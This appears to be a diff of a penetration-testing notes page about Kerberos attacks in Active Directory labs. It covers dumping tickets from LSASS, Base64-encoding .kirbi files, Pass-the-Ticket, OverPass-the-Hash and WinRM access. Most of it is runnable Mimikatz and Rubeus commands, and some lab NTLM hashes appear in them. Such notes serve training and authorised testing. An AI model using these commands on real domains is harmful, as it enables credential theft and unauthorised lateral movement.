@@ -590,12 +590,10 @@ We need a valid Kerberos ticket to perform a `Pass the Ticket (PtT)` attack. It 
 _On Windows, tickets are processed and stored by the LSASS (Local Security Authority Subsystem Service) process._
 
 * _That's why dumping with normal cmd gives your ticket only._&#x20;
-* _Dumping with administrator privilege gives all tickets from the machine._&#x20;
+* _Dumping with administrator privilege gives all tickets of users logged on from the machine._&#x20;
 {% endhint %}
 
-Therefore, to get a ticket from a Windows system, you must communicate with LSASS and request it. As a non-administrative user, you can only get your tickets, but as a local administrator, you can collect everything.
-
-### Using mimikatz&#x20;
+### Using Mimikatz
 
 {% code overflow="wrap" %}
 ```cmd
@@ -607,15 +605,28 @@ dir *.kirbi
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image (1736).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1743).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 **Observation:**&#x20;
 
 1. _The tickets that end with `$` correspond to the computer account, which needs a ticket to interact with the Active Directory._&#x20;
-2. _User tickets have the user's name, followed by an `@` that separates the service name and the domain, for example: `[randomvalue]-username@service-domain.local.kirbi`._
+2. _User tickets have the user's name, followed by an `@` that separates the service name and the domain, for example: `[randomvalue]-username@service-domain.local.kirbi` are the TGS tickets for specific service._&#x20;
 3. _If you pick a ticket with the service krbtgt, it corresponds to the TGT of that account. Other tickets are TGS ticket whereas ticket with `krbtgt` is TGT ticket for that account._&#x20;
 {% endhint %}
+
+### Convert .kirbi to Base64 Format
+
+{% code overflow="wrap" %}
+```powershell
+$file = Get-ChildItem *.kirbi
+[Convert]::ToBase64String([IO.File]::ReadAllBytes($file.FullName))
+
+[Convert]::ToBase64String([IO.File]::ReadAllBytes(".\romario.kirbi"))
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (1748).png" alt=""><figcaption></figcaption></figure>
 
 ### Using Rubeus&#x20;
 
@@ -631,7 +642,9 @@ Rubeus.exe dump /nowrap
 
 ## Pass-the-Ticket (PtT)
 
-### Using Rubeus&#x20;
+### Using Rubeus (OverPass the Hash -> PtT)
+
+* `/ptt` will inject the `romario` ticket into LSASS even though the logon session belongs to the `cjohnson`.
 
 {% code overflow="wrap" %}
 ```cmd
@@ -641,17 +654,79 @@ Rubeus.exe asktgt /domain:nexploit.local /user:romario /rc4:4ba55e3181a42ccd8610
 
 <figure><img src="../.gitbook/assets/image (1741).png" alt=""><figcaption></figcaption></figure>
 
-{% hint style="danger" %}
-Danger. still working will get on that.&#x20;
+<figure><img src="../.gitbook/assets/image (1745).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (1746).png" alt=""><figcaption></figcaption></figure>
+
+{% hint style="info" %}
+_The whoami command gives cjohnson because it looks locally who is logged in and that's cjohnson. But when we used `dir \\DC01\Romario_Share` then it uses the tickets that is injected in the LSASS and thus we're executing things with the context of Romario._&#x20;
 {% endhint %}
+
+{% hint style="danger" %}
+_No new CMD session is open when you use Rubeus for passing the ticket._&#x20;
+{% endhint %}
+
+### Using Rubeus (Using exported ticket)
+
+{% code overflow="wrap" %}
+```cmd
+Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (1747).png" alt=""><figcaption></figcaption></figure>
+
+### Using Rubeus (Base64 format)
+
+{% code overflow="wrap" %}
+```powershell
+Rubeus.exe ptt /ticket:<base64 ticket>
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (1749).png" alt=""><figcaption></figcaption></figure>
+
+### Using Mimikatz (Using exported ticket)
+
+{% code overflow="wrap" %}
+```
+mimikatz.exe
+privilege::debug
+kerberos::ptt "ticket_location.kirbi"
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (1750).png" alt=""><figcaption></figcaption></figure>
+
+## Remote Access with Pass the Ticket
+
+{% hint style="info" %}
+_Note that you must pass the correct krbtgt ticket for getting PowerShell remoting and that user must have account and should be allowed to login to domain controller._
+{% endhint %}
+
+### Using PowerShell Remoting (WinRM)
+
+{% code overflow="wrap" %}
+```powershell
+Enter-PSSession -ComputerName DC01
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (1752).png" alt=""><figcaption></figcaption></figure>
 
 ## OverPass the Hash (Pass the Key)
 
+<table><thead><tr><th width="354.79998779296875">Tickets</th><th>Keys</th></tr></thead><tbody><tr><td>Already issued</td><td>Secret material</td></tr><tr><td>Valid until expiration</td><td>Usually valid until password changes</td></tr><tr><td>Used directly to access service tickets (TGS)</td><td>Used to obtain new tickets (TGT)</td></tr><tr><td>Exported as <code>.kirbi</code></td><td>Displayed as hashes/keys</td></tr><tr><td>Stolen ticket is valid until it expires. </td><td>Keys can forge new tickets as per required. Unlimited access. </td></tr></tbody></table>
+
+{% hint style="info" %}
+_Rubeus is useful for this technique as it doesn't require administrator privileges for overpassing the hash._&#x20;
+{% endhint %}
+
 &#x20;The `Pass the Key` aka. `OverPass the Hash` approach converts a hash/key (rc4\_hmac, aes256\_cts\_hmac\_sha1, etc.) for a domain-joined user into a full `Ticket Granting Ticket` (`TGT`).&#x20;
 
-### Mimikatz - Extract kerberos keys&#x20;
+### Mimikatz - Extract Kerberos keys&#x20;
 
-To forge our tickets, we need to have the user's hash; we can use Mimikatz to dump all users Kerberos encryption keys using the module `sekurlsa::ekeys`.
+`sekurlsa::ekeys` will show the cryptographic keys currently stored for every Kerberos logon session. _<mark style="color:$danger;">A key can be used to request new tickets.</mark>_&#x20;
 
 {% code overflow="wrap" %}
 ```cmd
@@ -663,9 +738,7 @@ sekurlsa::ekeys
 
 <figure><img src="../.gitbook/assets/image (1738).png" alt=""><figcaption></figcaption></figure>
 
-As we're using the most recent version of Windows server we are not able to get the `RC4_HMAC` keys. But if we get that we can OverPass the Hash using the below tools.&#x20;
-
-### OverPass the Hash (Mimikatz)
+### Using Mimikatz (Get CMD)
 
 {% code overflow="wrap" %}
 ```cmd
@@ -675,13 +748,9 @@ sekurlsa::pth /domain:nexploit.local /user:romario /ntlm:4ba55e3181a42ccd8610dad
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image (1739).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1744).png" alt=""><figcaption></figcaption></figure>
 
-### OverPass the Hash (Rubeus)
-
-{% hint style="info" %}
-_It doesn't require administrator privileges for overpassing the hash._&#x20;
-{% endhint %}
+### Using Rubeus (Get Ticket)
 
 To forge a ticket using `Rubeus`, we can use the module `asktgt` with the username, domain, and hash which can be `/rc4`, `/aes128`, `/aes256`, or `/des`.
 
